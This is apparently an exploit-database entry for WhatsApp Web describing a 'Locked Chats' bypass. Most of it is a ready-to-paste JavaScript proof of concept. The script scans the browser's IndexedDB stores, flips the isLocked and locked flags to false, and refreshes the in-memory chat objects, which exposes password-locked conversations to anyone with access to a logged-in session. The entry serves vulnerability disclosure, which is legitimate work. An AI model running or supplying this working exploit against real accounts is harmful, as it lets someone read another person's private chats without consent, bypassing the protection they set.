@@ -1,0 +1,103 @@
+# Exploit Title: WhatsApp Web - Local "Locked Chats" UI Bypass (IndexedDB Manipulation)
+# Date: 2025-10-23
+# Exploit Author: Sds Dilqem Memmedov
+# Vendor Homepage: https://www.whatsapp.com
+# Software Link: https://web.whatsapp.com
+# Version: 2.3000.1028896525
+# Tested on: macOS / Windows / Linux - Chrome & Brave Browsers
+# CVE : N/A
+
+[Description]
+WhatsApp Web implements a "Locked Chats" feature that hides specific conversations behind a user-defined password. However, the "locked" status of these conversations is maintained via flags (isLocked/locked) within the browser's IndexedDB and localStorage.
+
+The provided Proof-of-Concept script identifies these flags within the local database candidates (e.g., "wawc", "model-storage"), modifies them to 'false', and attempts an in-memory UI refresh. This allows an attacker with local access to an authenticated session to view and interact with locked chats without requiring the secondary password.
+
+[Vulnerability Details]
+- Target Storage: IndexedDB (stores: chat, conversation, model-storage)
+- Impact: High - Exposes hidden messages and metadata locally.
+- Scope: web.whatsapp.com
+
+[Proof of Concept (PoC)]
+1. Log in to WhatsApp Web (web.whatsapp.com).
+2. Open the Browser Developer Tools (Console tab).
+3. Paste the following JavaScript code and execute:
+
+--- START CODE ---
+(async () => {
+  const dryRun = false;
+  const TARGET_DB_CANDIDATES = ["wawc","whatsapp","whatsapp_web","wa_db","model-storage","localforage"];
+  const PRIORITY_STORE_REGEX = /chat|conversation|convo|thread|store|contact|model-storage/i;
+
+  const log = (...args) => console.log("[UNLOCK ALL]", ...args);
+
+  const listDBs = async () => {
+    if (indexedDB && typeof indexedDB.databases === "function") {
+      try {
+        const dbs = await indexedDB.databases();
+        return dbs.map(d => d.name).filter(Boolean);
+      } catch (e) {}
+    }
+    return TARGET_DB_CANDIDATES;
+  };
+
+  const decodeId = rec => rec?.id ?? rec?.jid ?? rec?.chatId ?? rec?.userId ?? null;
+
+  const attemptInMemoryUpdate = (id) => {
+    try {
+      if (window.Store && window.Store.Chat) {
+        const Chat = window.Store.Chat;
+        let chatObj = (typeof Chat.get === "function") ? Chat.get(id) : null;
+        if (chatObj) {
+          chatObj.isLocked = false;
+          chatObj.locked = false;
+          chatObj.hasOpened = true;
+          if (typeof chatObj.save === "function") chatObj.save();
+          return true;
+        }
+      }
+    } catch (e) {}
+    return false;
+  };
+
+  const dbNames = await listDBs();
+  for (const dbName of dbNames) {
+    try {
+      const openReq = indexedDB.open(dbName);
+      const db = await new Promise((res, rej) => {
+        openReq.onsuccess = e => res(e.target.result);
+        openReq.onerror = e => rej(e.target.error);
+      });
+
+      const stores = Array.from(db.objectStoreNames || []);
+      for (const storeName of stores) {
+        if (!PRIORITY_STORE_REGEX.test(storeName)) continue;
+        const tx = db.transaction(storeName, "readwrite");
+        const store = tx.objectStore(storeName);
+        const all = await new Promise((res) => {
+          const r = store.getAll();
+          r.onsuccess = () => res(r.result || []);
+        });
+
+        for (const rec of all) {
+          if (rec && (rec.isLocked === true || rec.locked === true)) {
+            const id = decodeId(rec);
+            if (!dryRun) {
+              rec.isLocked = false;
+              rec.locked = false;
+              rec.hasOpened = true;
+              store.put(rec);
+              attemptInMemoryUpdate(id);
+            }
+          }
+        }
+      }
+      db.close();
+    } catch (e) {}
+  }
+  console.log("Process finished. RELOAD THE PAGE (F5) if UI didn't update.");
+})();
+--- END CODE ---
+
+[Contact]
+Author: Sds Dilqem Memmedov
+Email: sdsdilqem@gmail.com
